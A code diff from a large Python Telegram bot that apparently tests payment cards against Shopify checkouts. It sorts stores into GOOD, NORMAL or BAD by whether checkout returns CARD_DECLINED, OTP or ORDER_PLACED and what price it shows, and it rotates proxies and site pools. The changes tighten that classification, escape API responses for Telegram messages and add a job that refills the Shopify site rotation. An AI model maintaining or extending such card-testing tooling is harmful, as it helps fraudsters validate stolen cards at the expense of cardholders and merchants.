-                        # payment response (CARD_DECLINED, INSUFFICIENT_FUNDS,
-                        # ORDER_PLACED, OTP/3D, etc.) AND a real price. No
-                        # products.json shortcut — a site is only GOOD/NORMAL if
-                        # the checkout actually responded.
-                        print(f"❌ [CHKADD] BAD (no valid card response): {site_clean}")
+                        # Proper validation only: the API must return exactly
+                        # ORDER_PLACED, OTP, or CARD_DECLINED, AND a real price.
+                        # Nothing else counts anymore — a site is only
+                        # GOOD/NORMAL if the checkout gave one of those three.
+                        print(f"❌ [CHKADD] BAD (no valid card response): {site_clean} | {response_text}")
                         self.mark_api_result(api["name"], True, elapsed)
-                        return False, 0, "BAD - No price detected", data
+                        return False, 0, f"BAD - No price detected | {response_text}", data
                         
                 except json.JSONDecodeError:
                     self.mark_api_result(api["name"], False, elapsed)
@@ -69282,14 +69426,14 @@ class ChkaddAPIPoolManager:
                         "price": price,
                         "response": response
                     })
-                    print(f"🌟 [CHKADD] GOOD: {site} (${price:.2f})")
+                    print(f"🌟 [CHKADD] GOOD: {site} (${price:.2f}) | {response}")
                 elif 5 <= price < 10:
                     results["normal"].append({
                         "site": site,
                         "price": price,
                         "response": response
                     })
-                    print(f"📌 [CHKADD] NORMAL: {site} (${price:.2f})")
+                    print(f"📌 [CHKADD] NORMAL: {site} (${price:.2f}) | {response}")
                 else:
                     results["bad"].append({
                         "site": site,
@@ -69430,6 +69574,19 @@ async def chkadd_command_enhanced(update: Update, context: ContextTypes.DEFAULT_
     # No truncation — /chkadd now processes ALL sites (batched internally).
     await process_chkadd_enhanced(update, context, sites)
 
+
+
+def _safe_chkadd_snippet(text: str, length: int) -> str:
+    """
+    Truncate THEN escape a raw piece of API response/error text before it
+    gets embedded in an HTML-parsed Telegram message. Raw API responses
+    can contain literal tags like '<b>Site Error! Status: 402</b>', and
+    truncating a tag in half (or just leaving it unescaped) breaks
+    Telegram's HTML parser with 'Can't parse entities'. Truncating first
+    avoids ever splitting an HTML entity like &amp; in half.
+    """
+    text = text or ""
+    return html.escape(text[:length])
 
 
 async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT_TYPE, sites: list):
@@ -69612,7 +69769,7 @@ async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT
         response += f"🌟 <b>GOOD Sites Added ({len(all_good_sites)}):</b>\n"
         for site_data in all_good_sites[:15]:
             response += f"   • <code>{site_data['site']}</code> - ${site_data['price']:.2f}\n"
-            response += f"     📝 {site_data['response'][:40]}\n"
+            response += f"     📝 {_safe_chkadd_snippet(site_data['response'], 40)}\n"
         if len(all_good_sites) > 15:
             response += f"   ... and {len(all_good_sites) - 15} more\n"
     
@@ -69621,7 +69778,7 @@ async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT
         response += f"\n📌 <b>NORMAL Sites Added ({len(all_normal_sites)}):</b>\n"
         for site_data in all_normal_sites[:15]:
             response += f"   • <code>{site_data['site']}</code> - ${site_data['price']:.2f}\n"
-            response += f"     📝 {site_data['response'][:40]}\n"
+            response += f"     📝 {_safe_chkadd_snippet(site_data['response'], 40)}\n"
         if len(all_normal_sites) > 15:
             response += f"   ... and {len(all_normal_sites) - 15} more\n"
     
@@ -69641,7 +69798,7 @@ async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT
         response += f"\n❌ <b>Bad Sites (showing first 10 of {len(all_bad_sites)}):</b>\n"
         for site_data in all_bad_sites[:10]:
             response += f"   • <code>{site_data['site']}</code>\n"
-            response += f"     📝 {site_data['response'][:40]}\n"
+            response += f"     📝 {_safe_chkadd_snippet(site_data['response'], 40)}\n"
         if len(all_bad_sites) > 10:
             response += f"   ... and {len(all_bad_sites) - 10} more\n"
     
@@ -69650,7 +69807,7 @@ async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT
         response += f"\n⚠️ <b>Errors (showing first 5 of {len(all_error_sites)}):</b>\n"
         for site_data in all_error_sites[:5]:
             response += f"   • <code>{site_data['site']}</code>\n"
-            response += f"     ❌ {site_data.get('error', 'Unknown error')[:50]}\n"
+            response += f"     ❌ {_safe_chkadd_snippet(site_data.get('error', 'Unknown error'), 50)}\n"
         if len(all_error_sites) > 5:
             response += f"   ... and {len(all_error_sites) - 5} more\n"
     
@@ -69776,7 +69933,7 @@ async def process_chkadd_enhanced(update: Update, context: ContextTypes.DEFAULT_
         response += f"🌟 <b>GOOD Sites Found ({len(good_sites)}):</b>\n"
         for site_data in good_sites[:10]:
             response += f"   • <code>{site_data['site']}</code> - ${site_data['price']:.2f}\n"
-            response += f"     📝 {site_data['response'][:40]}\n"
+            response += f"     📝 {_safe_chkadd_snippet(site_data['response'], 40)}\n"
         if len(good_sites) > 10:
             response += f"   ... and {len(good_sites) - 10} more\n"
     
@@ -69784,7 +69941,7 @@ async def process_chkadd_enhanced(update: Update, context: ContextTypes.DEFAULT_
         response += f"\n📌 <b>NORMAL Sites Found ($5-$10 - {len(normal_sites)}):</b>\n"
         for site_data in normal_sites[:10]:
             response += f"   • <code>{site_data['site']}</code> - ${site_data['price']:.2f}\n"
-            response += f"     📝 {site_data['response'][:40]}\n"
+            response += f"     📝 {_safe_chkadd_snippet(site_data['response'], 40)}\n"
         if len(normal_sites) > 10:
             response += f"   ... and {len(normal_sites) - 10} more\n"
     
@@ -69799,7 +69956,7 @@ async def process_chkadd_enhanced(update: Update, context: ContextTypes.DEFAULT_
         response += f"\n⚠️ <b>Errors (showing first 5 of {len(error_sites)}):</b>\n"
         for site_data in error_sites[:5]:
             response += f"   • <code>{site_data['site']}</code>\n"
-            response += f"     ❌ {site_data.get('error', 'Unknown error')[:50]}\n"
+            response += f"     ❌ {_safe_chkadd_snippet(site_data.get('error', 'Unknown error'), 50)}\n"
         if len(error_sites) > 5:
             response += f"   ... and {len(error_sites) - 5} more\n"
     
@@ -82531,6 +82688,8 @@ def main():
     app.add_handler(CommandHandler("rgood_clear", rgood_clear_command))
     app.add_handler(CallbackQueryHandler(rgood_clear_callback, pattern='confirm_rgood_clear'))
     app.add_handler(CallbackQueryHandler(rgood_clear_callback, pattern='cancel_rgood_clear'))
+    app.add_handler(CallbackQueryHandler(rgood_all_callback, pattern='confirm_rgood_all'))
+    app.add_handler(CallbackQueryHandler(rgood_all_callback, pattern='cancel_rgood_all'))
     
     
     app.add_handler(MessageHandler(filters.Document.ALL & ~filters.TEXT, handle_document))
@@ -82607,6 +82766,14 @@ def main():
         app.job_queue.run_repeating(key_expiry_worker, interval=60, first=30)
         # Auto proxy test + dead-proxy cleanup, once every 24h (first run 1h after boot).
         app.job_queue.run_repeating(proxy_test_job, interval=86400, first=3600)
+        # Top up the Shopify rotation from the GOOD/NORMAL backup pool whenever
+        # it drops below SHOPIFY_ROTATION_MIN_SITES (checked every 10 min).
+        async def shopify_backup_reload_job(ctx):
+            try:
+                autosopi_site_manager.reload_from_backup_if_low()
+            except Exception as e:
+                print(f"⚠️ [QUALITY BACKUP] Reload job error: {e}")
+        app.job_queue.run_repeating(shopify_backup_reload_job, interval=600, first=60)
         print("✅ Job queue initialized with background tasks")
     else:
         print("⚠️ Job queue not available, using asyncio tasks instead")
